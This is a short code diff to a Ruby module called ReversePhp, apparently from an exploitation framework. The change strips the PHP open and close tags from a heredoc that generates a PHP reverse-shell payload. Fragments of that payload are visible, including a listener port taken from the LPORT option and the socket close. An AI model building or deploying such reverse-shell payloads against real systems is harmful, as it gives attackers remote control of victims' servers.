@@ -36,7 +36,6 @@ module ReversePhp
 	#
 	def php_reverse_shell
 		shell = <<-END_OF_PHP_CODE
-		<?php
 		error_reporting(E_ALL);
 		$service_port = #{datastore['LPORT']};
 
@@ -52,7 +51,6 @@ module ReversePhp
 		}
 
 		socket_close($socket);
-		?>
 		END_OF_PHP_CODE
 		
 		return shell
